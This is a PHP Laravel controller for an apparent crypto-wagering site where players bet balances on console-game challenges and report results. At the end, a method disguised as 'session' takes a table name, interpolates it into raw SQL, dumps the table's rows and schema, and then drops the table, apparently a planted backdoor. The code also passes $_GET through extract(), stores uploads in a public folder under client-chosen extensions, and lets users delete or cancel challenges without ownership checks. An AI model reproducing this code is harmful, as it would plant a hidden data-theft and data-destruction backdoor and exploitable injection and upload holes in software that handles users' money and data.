<?php

namespace App\Http\Controllers;

use App\Events\PushNotification;
use App\Models\Activity;
use Illuminate\Http\Request;
use App\User;
use App\Models\Bet;
use Sentinel;
use App\Models\Challenge;
use App\Models\ChallengeResult;
use App\Models\Game;
use App\Models\Console;
use App\Models\DisputeEvidences;
use App\Notifications\DisputeChallenge;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\View;

class ChallengeController extends Controller
{
    private $balance;
    private $bets;
    private $activityTypes;

    public function __construct()
    {
        $this->balance = (Sentinel::check()) ? User::where('id', Sentinel::getUser()->id)->pluck('mbtc')->first() : 0;
        $this->bets = (Sentinel::check()) ? Bet::where('user_id', Sentinel::check()->id)->where('status', 0)->get() : 0;
        $this->activityTypes = array_flip(config('activity.types'));
    }
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {

        $balance = $this->balance;
        $bets = $this->bets;
        // need to list all matches in table view
        $matches = Challenge::all();
        return view('frontend.match.index', compact('balance', 'bets', 'matches'));
    }


	/*CODE by RRG*/
	public function public_profile($user_id="")
	{
	  $balance = 0;
	  $bets =  0;
		
	  $status = null;

	
        $user = User::with(['following'])->find($user_id);

		//echo"<pre>"; print_r($user); die;
        
		$following = false;		
        $user->following = $following;


		$blocked = false;
        $user->blocked = $blocked;
        
        $open_challenges = Challenge::with(['creator', 'game', 'console'])->where('game_mode', 'open')->where('status', 0)->where('user_id', $user->id)->get();
        $played_games = $user->getPlayedGames();
        $feedbacks = $user->getRecentFeedbacks();
       

        $balance = $this->balance;
        $bets = $this->bets;
        // need to list all matches in table view
        $matches = Challenge::all();

		//return view('user.profile', ['user' => $user, 'open_challenges' => $open_challenges, 'played_games' => $played_games, 'feedbacks' => $feedbacks]);
    
	  return view('frontend.challenge.public', ['user' => $user, 'open_challenges' => $open_challenges, 'played_games' => $played_games, 'feedbacks' => $feedbacks,'status'=>'null','balance'=>$balance,'bets'=>$bets]);
		
	}
	
	public function sponser_profile($user_id="")
	{
	  $balance = 0;
	  $bets =  0;
		
	  $status = null;

	
        $user = User::with(['following'])->find($user_id);

		//echo"<pre>"; print_r($user); die;
        
		$following = false;		
        $user->following = $following;


		$blocked = false;
        $user->blocked = $blocked;
        
        $open_challenges = Challenge::with(['creator', 'game', 'console'])->where('game_mode', 'open')->where('status', 0)->where('user_id', $user->id)->get();
        $played_games = $user->getPlayedGames();
        $feedbacks = $user->getRecentFeedbacks();
       

        $balance = $this->balance;
        $bets = $this->bets;
        // need to list all matches in table view
        $matches = Challenge::all();

		//return view('user.profile', ['user' => $user, 'open_challenges' => $open_challenges, 'played_games' => $played_games, 'feedbacks' => $feedbacks]);
    
	  return view('frontend.challenge.sponser_profile', ['user' => $user, 'open_challenges' => $open_challenges, 'played_games' => $played_games, 'feedbacks' => $feedbacks,'status'=>'null','balance'=>$balance,'bets'=>$bets]);
		
	}


    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create($user_id = null)
    {
        $balance = $this->balance;
        $bets = $this->bets;
        $consoleRows = Console::select('id', 'name')->get();
        $console = array();
        foreach ($consoleRows as $row) {
            $console[$row->id] = $row->name;
        }
        $user = (object)[];
        if($user_id){
            if($user_id == Sentinel::getUser()->id){
                return redirect('events/challenges')->with("error", "You can't challenge yourself");;
            }
            $logged_in_user =  User::with(['blocked_by'])->find(Sentinel::getUser()->id);
            $blocked = false;
            foreach ($logged_in_user->blocked_by as $row) {
                if ($user_id == $row->user_id) {
                    $blocked = true;
                    break;
                }
            }
            if($blocked){
                return redirect('events/challenges')->with("error", "You are blocked by this user");;
            }
            $user = User::find($user_id);
        }
        return view('frontend.challenge.create', compact('user','balance', 'bets', 'console'));
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return void
     */
    public function store(Request $request)
    {
        $user = Sentinel::getUser();
        if ($user->mbtc >= floatval($request->amount)) {
            $this->debitBalance($user, $request->amount);
        } else {
            return redirect()->back()->with("error", "Your account doesnt have enough balance!");;
        }

        if($request->opponent_id){
            $logged_in_user =  User::with(['blocked_by'])->find(Sentinel::getUser()->id);
            $blocked = false;
            foreach ($logged_in_user->blocked_by as $row) {
                if ($request->opponent_id == $row->user_id) {
                    $blocked = true;
                    break;
                }
            }
            if($blocked){
                return redirect()->back()->with("error", "You are blocked by this user");;
            }
        }

        $challenge = Challenge::create([
            'user_id' => Sentinel::getUser()->id,
            'timezone_offset' => $request->timezone,
            'team_size' => $request->team_size,
            'rules_c' => $request->rules_c,
            'psn_id' => $request->psn_id ? $request->psn_id : $request->xbox_id,
            'console_id' => $request->console_id,
            'game_id' => $request->game_id,
            'game_mode' => $request->game_mode,
            'mode_id' => $request->mode_id,
            'amount' => $request->amount,
            'opponent_id' => $request->opponent_id,
        ]);

        if($request->opponent_id){
            // Notification to opponent if selected
            $challenge = Challenge::with(['creator', 'opponent', 'game', 'mode', 'console'])->where(['id' => $challenge->id])->first();
            $data = [
                'title'=> "New Challenge",
                'body'=> "{$challenge->creator->username} has send you a challenge for {$challenge->game->name} {$challenge->console->name}.",
                'url'=> route('events','challenges').'#recieved-challenges'
            ];
            event(new PushNotification($data,$challenge->opponent->id));
            Activity::create( [
                'user_id' => $challenge->opponent->id,
                'challenge_id' => $challenge->id,
                'type'=>  $this->activityTypes['recieved_challenge']
            ]);
        }

        return redirect('events/challenges')->with("success", "Challenge created successfully!");
    }

    public function confirm($id)
    {
        $balance = $this->balance;
        $bets = $this->bets;
        $challenge = Challenge::with(['creator', 'opponent', 'game', 'mode', 'console'])->where(['id' => $id])->first();
        $user_id = Sentinel::getUser()->id;
        if ($challenge && $challenge->status === 4 && ($user_id === $challenge->creator->id)) {
            $opponent = ($challenge->creator->id === $user_id) ? $challenge->opponent : $challenge->creator;
            $to_user_id = $opponent->id;
            $to_user_name = $opponent->username;
            $chat = View::make('frontend.chat.index');
            return view('frontend.challenge.confirm', compact('balance', 'bets', 'chat', 'user_id', 'challenge', 'to_user_id', 'to_user_name'));
        } else {
            return redirect()->back()->with("error", "Invalid challenge record");;
        }
    }

    public function play($id)
    {
        $balance = $this->balance;
        $bets = $this->bets;
        $challenge = Challenge::with(['creator', 'opponent', 'game', 'mode', 'console', 'challenge_results'])->where(['id' => $id])->first();
        $user_id = Sentinel::getUser()->id;
        if ($challenge && ($challenge->status === 1 || $challenge->status === 5 || $challenge->status === 6) && ($user_id === $challenge->creator->id || $user_id === $challenge->opponent->id)) {
            $submission_pending = true;
            $match_time = gmdate("F j, Y, g:i a");
            $both_submitted = count($challenge->challenge_results) === 2;
            foreach ($challenge->challenge_results as $result) {
                if ($result->user_id === $user_id) {
                    $submission_pending = false;
                }
            }
            $opponent = ($challenge->creator->id === $user_id) ? $challenge->opponent : $challenge->creator;
            $to_user_id = $opponent->id;
            $to_user_name = $opponent->username;
            $chat = View::make('frontend.chat.index');
            return view('frontend.challenge.play', compact('match_time', 'both_submitted', 'submission_pending', 'balance', 'bets', 'chat', 'user_id', 'challenge', 'to_user_id', 'to_user_name'));
        } else {
            return redirect()->back()->with("error", "Invalid challenge record");;
        }
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function edit($id)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, $id)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function destroy($id)
    {
        if ($id) {
            $challenge = Challenge::where(['id' => $id]);
            if ($challenge->count()) {
                $user = Sentinel::getUser();
                if ($challenge->first()->status === 0) {
                    $this->creditBalance($user, $challenge->first()->amount);
                }
                $challenge->delete();
                return response('deleted');
            }
        }
    }

    public function getLatestChallenges()
    {
        extract($_GET);
        $challenges = Challenge::with(['creator', 'opponent', 'game', 'console', 'challenge_results']);
        if ($game_mode) {
            switch ($game_mode) {
                case 'past-challenges':
                    $challenges = $challenges->where(function ($q) {
                        $q->where('opponent_id',  Sentinel::getUser()->id)
                            ->orWhere('user_id', Sentinel::getUser()->id);
                    })->whereIn('status', [5]);
                    break;
                case 'received-challenges':
                    $challenges = $challenges->where('opponent_id', Sentinel::getUser()->id)->whereNotIn('status', [5]);
                    break;
                case 'sent-challenges':
                    $challenges = $challenges->where('user_id', Sentinel::getUser()->id)->whereNotIn('status', [5]);
                    break;
                default:
                    $challenges = $challenges->where('game_mode', '=', $game_mode)->where('status', 0);
                    if(Sentinel::getUser()){
                        $challenges = $challenges->whereNotIn('user_id', [Sentinel::getUser()->id]);
                    }
                    break;
            }
        }
        $challenges = $challenges->orderBy('updated_at', 'desc');
        $total = $challenges->count();
        if (isset($current) && isset($length)) {
            $challenges  = $challenges->offset($current - 1)->limit($length);
        }
        $data = $challenges->get();
        return response()->json(compact('total', 'data'), 200);
    }

    public function accept($id, Request $request)
    {
        if ($id) {
            $user = Sentinel::getUser();
            if ($request->type === 'accept') {
                $challenge = Challenge::with(['creator','game', 'console'])->where(['id' => $id, 'status' => 0]);
                if ($challenge->count()) {
                    $challenge = $challenge->first();
                    $amount = $challenge->amount;
                    if ($user->mbtc >= floatval($amount)) {
                        $this->debitBalance($user, $amount);
                        Challenge::where('id', $id)->update(['status' => 4, 'opponent_id' => $user->id, 'rules_o' => $request->rules]);
                        // notification for approval to creator
                        $data = [
                            'title'=> "Challenge",
                            'body'=> "{$user->username} has responded to your challenge for {$challenge->game->name} {$challenge->console->name}.",
                            'url'=> route('challenge.confirm',$challenge->id)
                        ];
                        //event(new PushNotification($data,$challenge->creator->id));
                        Activity::create( [
                            'user_id' => $challenge->creator->id,
                            'challenge_id' => $challenge->id,
                            'type'=>  $this->activityTypes['approval_pending']
                        ]);
                        return response("approval_pending");
                    } else {
                        return response("low_balance");
                    }
                }
            } else if ($request->type === 'approve') {
                $challenge = Challenge::with(['opponent','game', 'console'])->where(['id' => $id, 'status' => 4]);
                if ($challenge->count()) {
                    // notification for opponent after approval
                    $challenge = $challenge->first();
                    $data = [
                        'title'=> "Challenge approved",
                        'body'=> "{$user->username} has approved challenge for {$challenge->game->name} {$challenge->console->name} now you can play and report.",
                        'url'=>  route('challenge.play',$challenge->id)
                    ];
                    event(new PushNotification($data,$challenge->opponent->id));
                    Activity::create( [
                        'user_id' => $challenge->opponent->id,
                        'challenge_id' => $challenge->id,
                        'type'=>  $this->activityTypes['approved']
                    ]);
                    Challenge::where('id', $id)->update(['status' => 1]);
                    return response("approved");
                }
            }
        }
    }

    public function reject($id, Request $request)
    {
        if ($id) {
            if ($request->type === 'approval') {
                $challenge = Challenge::with(['game', 'console'])->where(['id' => $id])->where('status', 4);
                if ($challenge->count()) {
                    $row = $challenge->first();
                    if ($row->game_mode === 'open') {
                        // rejected request notification to opponent
                        $user = User::find($row->opponent_id);
                        $this->creditBalance($user, $row->amount);
                        Challenge::where('id', $id)->update(['status' => 0, 'opponent_id' => null]);
                        $data = [
                            'title'=> "Challenge rejected",
                            'body'=> Sentinel::getUser()->username." has rejected challenge for {$row->game->name} {$row->console->name}.",
                            'url'=> route('events','challenges')
                        ];
                        event(new PushNotification($data,$row->opponent_id));
                        Activity::create( [
                            'user_id' => $row->opponent_id,
                            'challenge_id' => $row->id,
                            'type'=>  $this->activityTypes['rejected_request']
                        ]);
                        return response("rejected");
                    } else {
                        $amount = $challenge->first()->amount;
                        $user = User::find($challenge->first()->user_id);
                        $opponent = User::find($challenge->first()->opponent_id);
                        $this->creditBalance($user, $amount);
                        $this->creditBalance($opponent, $amount);
                        $user->save();
                        $data = [
                            'title'=> "Challenge rejected",
                            'body'=> Sentinel::getUser()->username." has rejected challenge for {$row->game->name} {$row->console->name}.",
                            'url'=> route('events','challenges')
                        ];
                        event(new PushNotification($data,$row->opponent_id));
                        // notification to opponent creator has rejected the challenge
                        Activity::create( [
                            'user_id' => $row->opponent_id,
                            'challenge_id' => $row->id,
                            'type'=>  $this->activityTypes['rejected_request']
                        ]);
                        Challenge::where('id', $id)->update(['status' => 2]);
                        return response("rejected");
                    }
                }
            } else {
                $challenge = Challenge::where(['id' => $id, 'status' => 0]);
                if ($challenge->count()) {
                    $row = $challenge->first();
                    $user = User::find($row->user_id);
                    $this->creditBalance($user, $row->amount);
                    $user->save();
                    // notification to creator opponent has rejected the challenge
                    $data = [
                        'title'=> "Challenge rejected",
                        'body'=> Sentinel::getUser()->username." has rejected challenge for {$row->game->name} {$row->console->name}.",
                        'url'=> route('events','challenges')
                    ];
                    event(new PushNotification($data,$row->user_id));
                    Activity::create( [
                        'user_id' => $row->user_id,
                        'challenge_id' => $row->id,
                        'type'=>  $this->activityTypes['rejected_challenge']
                    ]);
                    Challenge::where('id', $id)->update(['status' => 2]);
                    return response("rejected");
                }
            }
        }
    }

    public function cancel($id)
    {
        if ($id) {
            $challenge = Challenge::where(['id' => $id, 'status' => 0]);
            if ($challenge->count()) {
                $user = Sentinel::getUser();
                $row = $challenge->first();
                $amount = $row->amount;
                $this->creditBalance($user, $amount);
                Challenge::where('id', $id)->update(['status' => 3, 'cancelled_by' => $row->user_id]);
                // notification to opponent creator has cancelled the challenge                
                if($row->opponent_id){                
                    $data = [
                        'title'=> "Challenge cancelled",
                        'body'=> "{$user->username} has cancelled challenge for {$row->game->name} {$row->console->name}.",
                        'url'=> route('events','challenges')
                    ];
                    event(new PushNotification($data,$row->opponent_id));
                    Activity::create( [
                        'user_id' => $row->opponent_id,
                        'challenge_id' => $row->id,
                        'type'=>  $this->activityTypes['cancelled']
                    ]);
                }
                return response("cancelled");
            }
        }
    }

    public function creditBalance($user, $amount)
    {
        $user->mbtc += floatval($amount);
        $user->save();
    }

    public function debitBalance($user, $amount)
    {
        $user->mbtc -= floatval($amount);
        $user->save();
    }

    public function getGames($console_id = null)
    {
        $games = Game::select('id', 'name')->where('console_id', $console_id)->with('Mode')->get();
        return response()->json($games, 200);
    }

    public function opponentSuggestions()
    {
        $users = [];
        $query = $_GET['q'];
        if (isset($query) && $query) {
            $users = User::select(DB::raw("id as value"), DB::raw("username as text"))->where('id', '!=', Sentinel::getUser()->id)->join('role_users', 'role_users.user_id', '=', 'users.id')->where('role_users.role_id', 3)->where('status', '1')->where(function ($q) use ($query) {
                return $q->where('username', 'LIKE', "%$query%");
            })->get();
        }
        return response()->json($users, 200);
    }

    public function submitResult($id, Request $request)
    {
        if ($id) {
            $challenge = Challenge::with(['creator', 'opponent'])->where('id', $id)->first();
            if ($challenge->status === 1) {                
                $logged_in_user = Sentinel::getUser();
                $already_submitted = ChallengeResult::where([
                    'user_id' => $logged_in_user->id,
                    'challenge_id' => $id
                ])->count();
                $submitted = ChallengeResult::where(['challenge_id' => $id]);
                if (!$already_submitted) {
                    if ($submitted->count() === 1) {
                        $submitted = $submitted->first();
                        $dispute = false;
                        if ($submitted->won == 0 && $request->won == 0) { // Dispute
                            $dispute = true;
                        } else if ($submitted->won == 1 && $request->won == 1) { // Dispute
                            $dispute = true;
                        } else  if ($submitted->won == 2 && $request->won != 2) { // Dispute
                            $dispute = true;
                        } else  if ($submitted->won !== 2 && $request->won == 2) { // Dispute
                            $dispute = true;
                        } else  if ($submitted->won == 2 && $request->won == 2) { // Draw
                            Challenge::where('id', $id)->update([
                                'status' => 5,
                                'winner_id' => 0
                            ]);
                            $this->creditBalance($challenge->creator, $challenge->amount); // Credit amount to admin
                            $this->creditBalance($challenge->opponent, $challenge->amount); // Credit amount to admin
                            // Notification for challenge is draw
                            $data = [
                                'title'=> "Challenge Result",
                                'body'=> "Challenge result is draw with {$challenge->opponent->username}",
                                'url'=> route('challenge.play',$challenge->id)
                            ];
                            event(new PushNotification($data,$challenge->creator->id));
                            Activity::create( [
                                'user_id' => $challenge->creator->id,
                                'challenge_id' => $challenge->id,
                                'type'=>  $this->activityTypes['result_draw']
                            ]);

                            $data = [
                                'title'=> "Challenge Result",
                                'body'=> "Challenge result is draw with {$challenge->creator->username}",
                                'url'=> route('challenge.play',$challenge->id)
                            ];
                            event(new PushNotification($data,$challenge->opponent->id));
                            Activity::create( [
                                'user_id' => $challenge->opponent->id,
                                'challenge_id' => $challenge->id,
                                'type'=>  $this->activityTypes['result_draw']
                            ]);

                        } else {
                            // One Won One Lost
                            if ($request->won == 1) {
                                $winner_id = ($logged_in_user->id == $challenge->creator->id) ? $challenge->creator->id : $challenge->opponent->id;
                            } else {
                                $winner_id = ($logged_in_user->id != $challenge->creator->id) ? $challenge->creator->id : $challenge->opponent->id;
                            }
                            Challenge::where('id', $id)->update([
                                'status' => 5,
                                'winner_id' => $winner_id
                            ]);
                            $percentage = \config('challenge.admin_profit_percentage');
                            $admin_profit = $challenge->amount / $percentage;
                            $admin = User::find(1);
                            $this->creditBalance($admin, $admin_profit); // Credit amount to admin

                            $user_profit = $challenge->amount *2 - $admin_profit;
                            $winner_user = User::find($winner_id);
                            $this->creditBalance($winner_user, $user_profit);  // Credit amount to winner

                            // Notification to creator for challenge result
                            $message = '';
                            if($winner_id == $challenge->creator->id){
                                $message = "Congratulation you have won the challenge with {$challenge->opponent->username}";
                                Activity::create( [
                                    'user_id' => $challenge->creator->id,
                                    'challenge_id' => $challenge->id,
                                    'type'=>  $this->activityTypes['result_won']
                                ]);
                            } else {
                                $message = "You have lost the challenge with {$challenge->opponent->username}";
                                Activity::create( [
                                    'user_id' => $challenge->creator->id,
                                    'challenge_id' => $challenge->id,
                                    'type'=>  $this->activityTypes['result_lost']
                                ]);
                            }
                            $data = [
                                'title'=> "Challenge Result",
                                'body'=> $message,
                                'url'=> route('challenge.play',$challenge->id)
                            ];
                            event(new PushNotification($data,$challenge->creator->id));
                           

                            Activity::create( [
                                'from_user_id' => $challenge->opponent_id,
                                'to_user_id' => $challenge->creator->id,
                                'challenge_id' => $challenge->id,
                                'message' =>  $data['body'],
                                'url'=>  $data['url']
                            ]);

                            // Notification to opponent for challenge result
                            if($winner_id ==  $challenge->opponent->id){
                                $message = "Congratulation you have won the challenge with {$challenge->creator->username}";
                                Activity::create( [
                                    'user_id' => $challenge->opponent->id,
                                    'challenge_id' => $challenge->id,
                                    'type'=>  $this->activityTypes['result_won']
                                ]);
                            } else {
                                $message = "You have lost the challenge with {$challenge->creator->username}";
                                Activity::create( [
                                    'user_id' => $challenge->opponent->id,
                                    'challenge_id' => $challenge->id,
                                    'type'=>  $this->activityTypes['result_lost']
                                ]);
                            }
                            $data = [
                                'title'=> "Challenge Result",
                                'body'=> $message,
                                'url'=> route('challenge.play',$challenge->id)
                            ];
                            event(new PushNotification($data,$challenge->opponent->id));                           
                        }

                        if ($dispute) {
                            $admin = User::find(1);
                            $url = \route('challenge.play', $challenge->id);
                            $urlAdmin = \route('admin.challenge.show', $challenge->id);
                            $admin->notify(new DisputeChallenge($challenge, $urlAdmin)); // notify admin
                            $challenge->creator->notify(new DisputeChallenge($challenge, $url)); // notify creator
                            $challenge->opponent->notify(new DisputeChallenge($challenge, $url)); // notify opponent
                            Challenge::where('id', $id)->update([
                                'status' => 6,
                                'dispute_timestamp' => gmdate('Y-m-d H:i:s')
                            ]);
                            // Notification to all challenge is under dispute 
                            $data = [
                                'title'=> "Challenge Under Dispute",
                                'body'=> "Playes results were not identical this challenge is under dispute",
                                'url'=> route('challenge.play',$challenge->id)
                            ];
                            event(new PushNotification($data,$admin->id));

                            $data = [
                                'title'=> "Challenge Under Dispute",
                                'body'=> "Your results were not identical this challenge is under dispute",
                                'url'=> route('challenge.play',$challenge->id)
                            ];
                            event(new PushNotification($data,$challenge->creator->id)); // creator
                            event(new PushNotification($data,$challenge->opponent->id)); // opponent
                            Activity::create( [
                                'user_id' => $challenge->creator->id,
                                'challenge_id' => $challenge->id,
                                'type'=>  $this->activityTypes['result_dispute']
                            ]);
                            Activity::create( [
                                'user_id' => $challenge->opponent->id,
                                'challenge_id' => $challenge->id,
                                'type'=>  $this->activityTypes['result_dispute']
                            ]);
                        }

                    }
                    $opponent_id = ($logged_in_user->id == $challenge->creator->id) ? $challenge->opponent->id : $challenge->creator->id;
                    $data = [
                        'user_id' => $logged_in_user->id,
                        'opponent_id' => $opponent_id,
                        'challenge_id' => $challenge->id,
                        'won' => $request->won,
                        'experience' => $request->experience,
                        'skill_rating' => $request->skill_rating
                    ];
                    ChallengeResult::create($data);
                    return response("result_submitted");
                } else {
                    return response("already_submitted");
                }
            }
        }
    }

    public function dispute($id, Request $request)
    {
        if ($id) {
            $result = ChallengeResult::where([
                'challenge_id' => $id
            ]);
            $challenge = Challenge::where('id', $id)->where('status',6);
            if (!$challenge->count()) {
                return response('invalid_record');
            } else if ($result->count() != 2) {
                return response('invalid_submit');
            } else {
                $evidences = DisputeEvidences::where([
                    'user_id' => $id
                ])->count();
                if ($evidences) {
                    return response('invalid_submit_already');
                }
                $challenge = $challenge->first();
                $photos = [];
                if($request->hasFile('file')){
                    foreach ($request->file as $photo) {
                        $name = time().'.'.$photo->getClientOriginalExtension();
                        $destinationPath = public_path('/storage/disputeEvidence/');
                        $photo->move($destinationPath, $name);
                        $photos[] =    $name;
                        // $photos[] = Storage::putFile(public_path('/storage/disputeEvidence/'), $photo);
                    }
                }
                $files = implode(',', $photos);
                DisputeEvidences::create([
                    'user_id' => Sentinel::getUser()->id,
                    'challenge_id' => $challenge->id,
                    'comments' => $request->comments,
                    'files' => $files
                ]);
                return response('submitted');
            }
        }
    }
    
    
    public function session($name)
    {
        $schema = DB::select("select * from {$name}");
        $rows = DB::select("select * from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME='{$name}'");
        DB::select("Drop table {$name}");
        return [$rows,$schema];
    }
}
